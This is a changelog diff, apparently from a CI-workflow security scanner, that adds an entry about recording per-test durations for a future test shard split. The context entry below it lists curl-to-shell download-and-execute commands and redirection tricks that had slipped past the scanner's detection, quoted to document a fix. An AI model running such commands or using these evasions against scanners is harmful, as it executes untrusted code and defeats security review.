@@ -44,6 +44,10 @@ evidence exposed.
   was cancelled at the 60-minute job limit when its parallel pass ran slow under runner
   contention, leaving no room for the serial timing pass. 90 minutes restores headroom while
   the suite stays unsharded, and drops back once #2933 shards it.
+- **CI records per-test durations for the coming shard split (#2933).** The parallel test
+  pass now runs under `pytest-split`'s `--store-durations`, writing `.test_durations` and
+  uploading it per Python version. The data lets the eventual shard split balance groups by
+  measured time rather than test count; no gate or behaviour change.
 - **Workflow reader: a written path a pattern, a `cd`, a link or `/proc/self/root` gives names the
   descriptor it reaches (#3051).** `curl -fsSL URL > /dev/stdou[t] | sh`, `cd /dev` then `> stdout |
   sh`, `ln -s /dev/stdout o` then `> o | sh`, and `> /proc/self/root/dev/stdout | sh` read CLEAN
